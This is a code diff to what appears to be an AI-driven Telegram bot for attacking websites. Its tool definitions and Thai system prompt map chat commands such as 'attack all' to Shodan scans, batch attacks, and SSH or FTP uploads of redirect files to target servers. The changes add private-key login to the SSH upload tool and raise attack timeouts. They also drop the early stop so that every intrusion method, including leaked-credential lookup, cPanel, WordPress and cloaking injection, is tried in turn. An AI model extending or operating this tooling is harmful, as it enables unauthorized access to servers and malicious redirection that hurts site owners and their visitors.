@@ -174,7 +174,7 @@ const recentCompletedAttacks: Array<{
   completedAt: number;
 }> = [];
 const MAX_RECENT_COMPLETED = 20;
-const ATTACK_TIMEOUT_MS = 20 * 60 * 1000; // 20 minutes — ให้เวลาเพียงพอสำหรับ recon + upload phases
+const ATTACK_TIMEOUT_MS = 30 * 60 * 1000; // 30 minutes — ให้เวลาเพียงพอสำหรับรันทุกระบบครบ (Shodan + LeakCheck + FTP + SSH + cPanel + WP + all methods)
 
 function registerRunningAttack(domain: string, method: string, chatId: number, progressMsgId: number): RunningAttack {
   const id = `${domain}:${method}:${Date.now()}`;
@@ -1194,18 +1194,20 @@ const AI_TOOLS: Tool[] = [
     type: "function" as const,
     function: {
       name: "ssh_upload",
-      description: "อัปโหลดไฟล์ redirect ผ่าน SSH/SFTP ด้วย credentials ที่ระบุ — ใช้เมื่อมี username/password ของ SSH เป้าหมาย",
+      description: "อัปโหลดไฟล์ redirect ผ่าน SSH/SFTP ด้วย credentials (password หรือ private key) — ใช้เมื่อมี username + password หรือ private key ของ SSH เป้าหมาย",
       parameters: {
         type: "object",
         properties: {
           host: { type: "string", description: "IP หรือ hostname ของเซิร์ฟเวอร์" },
           username: { type: "string", description: "SSH username" },
-          password: { type: "string", description: "SSH password" },
+          password: { type: "string", description: "SSH password (ถ้าใช้ key auth ไม่ต้องระบุ)" },
+          privateKey: { type: "string", description: "PEM-encoded SSH private key (RSA/Ed25519/ECDSA) สำหรับ key-based auth" },
+          passphrase: { type: "string", description: "Passphrase สำหรับ encrypted private key (ถ้ามี)" },
           domain: { type: "string", description: "โดเมนเป้าหมาย (สำหรับ web root detection)" },
           redirectUrl: { type: "string", description: "URL ที่จะ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
           port: { type: "number", description: "SSH port (default: 22)" },
         },
-        required: ["host", "username", "password", "domain"],
+        required: ["host", "username", "domain"],
       },
     },
   },
@@ -1965,11 +1967,14 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         const { sshUploadRedirect } = await import("./ssh-uploader");
         const sshHost = args.host as string;
         const sshUser = args.username as string;
-        const sshPass = args.password as string;
+        const sshPass = (args.password as string) || "";
+        const sshPrivateKey = (args.privateKey as string) || undefined;
+        const sshPassphrase = (args.passphrase as string) || undefined;
         const sshDomain = args.domain as string;
         const sshPort = (args.port as number) || 22;
         const sshRedirect = (args.redirectUrl as string) || "";
         const duration0ssh = Date.now();
+        const authType = sshPrivateKey ? '🔐 key' : '🔑 password';
 
         // Get redirect URL from pool if not specified
         let finalRedirectUrl = sshRedirect;
@@ -1985,7 +1990,14 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
 
         const progressLines: string[] = [];
         const result = await sshUploadRedirect({
-          credential: { host: sshHost, username: sshUser, password: sshPass, port: sshPort },
+          credential: {
+            host: sshHost,
+            username: sshUser,
+            password: sshPass,
+            port: sshPort,
+            ...(sshPrivateKey ? { privateKey: sshPrivateKey } : {}),
+            ...(sshPassphrase ? { passphrase: sshPassphrase } : {}),
+          },
           redirectUrl: finalRedirectUrl,
           targetDomain: sshDomain,
           timeout: 30000,
@@ -1994,9 +2006,9 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
         const durSSH = Date.now() - duration0ssh;
 
         if (result.success) {
-          return `\u2705 SSH upload \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08!\n\n\ud83d\udd10 ${sshUser}@${sshHost}:${sshPort}\n\ud83d\udcc1 ${result.filePath || "N/A"}\n\ud83d\udd17 ${result.url}\n\ud83d\udee0\ufe0f Method: ${result.method}\n\ud83d\udcc2 Web root: ${result.webRoot || "N/A"}\n\ud83d\udda5\ufe0f Server: ${result.serverInfo || "N/A"}\n\n\u23f1 ${formatDuration(durSSH)}`;
+          return `✅ SSH upload สำเร็จ! (${authType})\n\n🔐 ${sshUser}@${sshHost}:${sshPort}\n📁 ${result.filePath || "N/A"}\n🔗 ${result.url}\n🛠️ Method: ${result.method}\n📂 Web root: ${result.webRoot || "N/A"}\n🖥️ Server: ${result.serverInfo || "N/A"}\n\n⏱ ${formatDuration(durSSH)}`;
         } else {
-          return `\u274c SSH upload \u0e25\u0e49\u0e21\u0e40\u0e2b\u0e25\u0e27\n\n\ud83d\udd10 ${sshUser}@${sshHost}:${sshPort}\n\u26a0\ufe0f ${result.error}\n\n${progressLines.slice(-5).join("\n")}\n\n\u23f1 ${formatDuration(durSSH)}`;
+          return `❌ SSH upload ล้มเหลว (${authType})\n\n🔐 ${sshUser}@${sshHost}:${sshPort}\n⚠️ ${result.error}\n\n${progressLines.slice(-5).join("\n")}\n\n⏱ ${formatDuration(durSSH)}`;
         }
       }
 
@@ -2119,7 +2131,7 @@ function buildSystemPrompt(context: SystemContext): string {
 - "batch" / "โจมตีหลายเว็บ" / "โจมตีทั้งหมด" / "attack all" + รายชื่อโดเมน → เรียก batch_attack
 - "สถานะ batch" / "batch status" → เรียก batch_status
 - "สแกนพอร์ต" / "scan port" / "shodan" / "ดูพอร์ต" / "เปิดอะไรบ้าง" + domain → เรียก shodan_scan
-- "ssh" / "sftp" / "อัพผ่าน ssh" / "ssh upload" + host/user/pass → เรียก ssh_upload
+- "ssh" / "sftp" / "อัพผ่าน ssh" / "ssh upload" / "ssh key" + host/user/pass หรือ private key → เรียก ssh_upload (รองรับทั้ง password และ private key auth)
 - "ftp" / "อัพผ่าน ftp" / "ftp upload" + host/user/pass → เรียก ftp_upload
 - user ส่งไฟล์ .txt ที่มีรายชื่อโดเมน → ระบบจะจัดการอัตโนมัติ (แสดง confirmation keyboard)
 
@@ -5338,7 +5350,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         redirect: 90 * 1000,           // 1.5 min (reduced from 2)
       };
       const DEFAULT_METHOD_TIMEOUT = 2 * 60 * 1000; // 2 min default (reduced from 3)
-      const MAX_CONSECUTIVE_FAILURES = 5; // Stop after 5 consecutive failures
+      const MAX_CONSECUTIVE_FAILURES = 15; // Stop after 15 consecutive failures (run ALL systems before giving up)
       
       // Helper: run with per-method timeout
       const withMethodTimeout = async <T,>(methodId: string, fn: () => Promise<T>): Promise<T> => {
@@ -5408,7 +5420,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
                 enableComprehensiveAttacks: true,
                 enablePostUpload: true,
                 userId: 1,
-                globalTimeout: 10 * 60 * 1000, // 10 min — pipeline METHOD_TIMEOUT is 12 min, leave 2 min buffer
+                globalTimeout: 15 * 60 * 1000, // 15 min — ให้เวลาพอรันทุก phase ครบ (Shodan + LeakCheck + FTP + SSH + cPanel + WP + all methods)
               },
               async (event) => {
                 const elapsed = Math.round((Date.now() - methodStart) / 1000);
@@ -6203,12 +6215,11 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         
         timings.push({ step: `Method ${mi + 1}: ${methodDef.name}`, ms: methodDurationMs, ok: fullChainSuccess });
         
-        // Early exit: stop if too many consecutive failures
-        if (!fullChainSuccess && failedMethods.length >= MAX_CONSECUTIVE_FAILURES) {
-          await narrator.addStep(`⚠️ ${failedMethods.length} วิธีล้มเหลวติดกัน — หยุดเพื่อประหยัดเวลา`);
-          await narrator.completeLastStep("failed");
-          await narrator.addAnalysis(`💡 ลองใช้วิธีเฉพาะเจาะจง เช่น hijack_redirect หรือ cloaking_inject`);
-          break;
+        // Early exit: only stop if ALL methods exhausted (no premature exit)
+        // We want to try EVERY method before giving up
+        if (!fullChainSuccess && failedMethods.length >= MAX_CONSECUTIVE_FAILURES && mi < methodOrder.length - 1) {
+          // Don't break — just log a warning and continue trying remaining methods
+          await narrator.addAnalysis(`⚠️ ${failedMethods.length} วิธีล้มเหลว — ยังเหลืออีก ${methodOrder.length - mi - 1} วิธี ลุยต่อ...`);
         }
         
         // Early exit: check total elapsed time (safety net)
